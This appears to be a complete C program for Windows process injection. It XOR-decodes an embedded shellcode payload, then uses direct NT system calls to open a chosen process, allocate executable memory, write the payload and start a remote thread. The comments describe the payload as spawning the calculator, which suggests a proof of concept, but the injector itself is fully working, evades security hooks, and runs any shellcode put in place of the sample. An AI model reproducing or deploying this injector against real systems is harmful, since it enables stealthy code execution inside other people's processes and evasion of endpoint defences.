#include <stdio.h>
#include "syscalls.h"

const char k[4] = "[+]";
const char i[4] = "[*]";
const char e[4] = "[-]";

HANDLE hProcess, hThread;
LPVOID baseAddress = NULL;

/* place encoded shellcode here */
unsigned char shellcode[] = "\x9e\x29\xea\x88\x95\x91\xa2\x61\x69\x6c\x24\x28\x23\x31\x3b\x3d\x33\x31"
							"\x53\xb3\x0c\x24\xee\x2b\x02\x29\xe2\x3e\x7d\x31\xe9\x33\x49\x24\xee\x0b\x32"
							"\x29\x66\xdb\x2f\x33\x2f\x50\xa0\x24\x54\xb9\xce\x5d\x08\x10\x67\x55\x42\x20"
							"\xa8\xa5\x68\x38\x63\xa0\x8b\x81\x37\x38\x33\x29\xe2\x3e\x45\xf2\x20\x5d\x21"
							"\x6d\xb5\xf2\xe2\xe9\x69\x6c\x65\x31\xe7\xa1\x1d\x0b\x2d\x78\xb2\x31\xe2\x24"
							"\x7d\x3d\xe9\x21\x49\x25\x64\xa9\x81\x37\x21\x93\xac\x38\xe9\x55\xe1\x24\x64"
							"\xaf\x2f\x50\xa0\x24\x54\xb9\xce\x20\xa8\xa5\x68\x38\x63\xa0\x51\x8c\x10\x88"
							"\x2e\x62\x25\x48\x6d\x3c\x5b\xb0\x1c\xb4\x3d\x3d\xe9\x21\x4d\x25\x64\xa9\x04"
							"\x20\xe2\x60\x2d\x3d\xe9\x21\x75\x25\x64\xa9\x23\xea\x6d\xe4\x2d\x78\xb2\x20"
							"\x31\x2d\x3d\x27\x3b\x3b\x28\x34\x24\x20\x23\x3b\x21\xef\x89\x59\x23\x33\x96"
							"\x8c\x3d\x38\x3b\x3b\x21\xe7\x77\x90\x35\x9e\x96\x93\x38\x31\xd8\x60\x69\x6c"
							"\x65\x79\x62\x61\x69\x24\xe8\xf4\x63\x60\x69\x6c\x24\xc3\x53\xea\x06\xeb\x9a"
							"\xac\xd9\x81\x74\x46\x6f\x38\xd8\xc7\xfc\xd1\xf8\x86\xb7\x29\xea\xa8\x4d\x45"
							"\x64\x1d\x63\xec\x9e\x99\x17\x64\xd2\x2b\x76\x0b\x0d\x0b\x69\x35\x24\xf0\xb8"
							"\x9e\xbc\x0f\x08\x1d\x4c\x04\x11\x09\x45\x56\x01\x41\x0a\x0d\x09\x1a\x4c\x04"
							"\x11\x09\x65\x79"; // calc spawn

SIZE_T shellcodeSize = sizeof(shellcode);

int main(int argc, char* argv[]) {

	if (argc < 3) {
		printf("%s usage: directsyscalls.exe <PID> <XOR_KEY>, error: %ld", e, GetLastError());
		return EXIT_FAILURE;
	}

	DWORD PID = atoi(argv[1]);
	CLIENT_ID cID = { (HANDLE)PID, NULL };
	OBJECT_ATTRIBUTES objAttrs = { sizeof(objAttrs) };

	char* key = argv[2]; /* make sure this is the same key used in the encryption process */

	printf("%s decoding with key: %s\n", i, key);
	printf("%s decoded %zd-bytes\n\n\r", k, shellcodeSize);

	/* xor-decrypt shellcode */
	size_t keyLength = strlen(key);
	printf("unsigned char shellcode[] = \"");
	for (int x = 0; x < shellcodeSize - 1; x++) {
		shellcode[x] = shellcode[x] ^ key[x % keyLength];
		printf("\\x%02x", shellcode[x]);
	}
	printf("\";\n\n");

	int b = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttrs, &cID);
	printf("ntopenprocess returned 0x%llx\n", b);

	if (!hProcess || hProcess == NULL) {
		printf("%s could not get a handle to process (%d), error: %ld", e, PID, GetLastError());
		return EXIT_FAILURE;
	}

	printf("%s NtOpenProcess() ===-----------------> opened a handle to process (%d)\n", k, PID);
	printf("%s NtAllocateVirtualMemory() ===--> allocating %zu-bytes to target process\n", i, shellcodeSize);
	int a = NtAllocateVirtualMemory(hProcess, &baseAddress, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	printf("NtAllocateVirtualMemory returned 0x%llx\n", a);
	printf("allocated to 0x%llx\n", baseAddress);
	printf("%s NtAllocateVirtualMemory() ===---> allocated %zu-bytes to target process\n", k, sizeof(shellcode)); /* @shellcode -> 4096-bytes */

	printf("%s NtWriteVirtualMemory() ===------------------> writing to process memory\n", i);
	int d = NtWriteVirtualMemory(hProcess, baseAddress, &shellcode, sizeof(shellcode), NULL);
	printf("NtWriteVirtualMemory returned 0x%llx\n", d);

	printf("%s NtWriteVirtualMemory() ===--------------------> wrote to process memory\n", k);


	printf("%s NtCreateThreadEx() ===--------------> creating thread in remote process\n", i);
	int c = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, baseAddress, NULL, FALSE, 0, 0, 0, NULL);
	printf("ntcreatehtreadx returned 0x%llx\n", c);
	printf("%s NtCreateThreadEx() ===---------------------------------> thread created\n", k);
	
	if (!hThread || hThread == NULL) {
		printf("%s could not get a handle to thread, error: %ld", e, GetLastError());
		NtClose(hProcess);
		return EXIT_FAILURE;
	}

	WaitForSingleObject(hThread, INFINITE);
	printf("%s WaitForSingleObject() ===-------------------> thread finished execution\n", k);

	printf("%s NtClose() ===------------------------> closing handle to process (%d)\n", i, PID);
	NtClose(hProcess);
	printf("%s NtClose() ===-------------------------> closed handle to process (%d)\n", k, PID);

	printf("%s NtClose() ===--------------------------------> closing handle to thread\n", i);
	NtClose(hThread);
	printf("%s NtClose() ===---------------------------------> closed handle to thread\n", k);

	return EXIT_SUCCESS;

}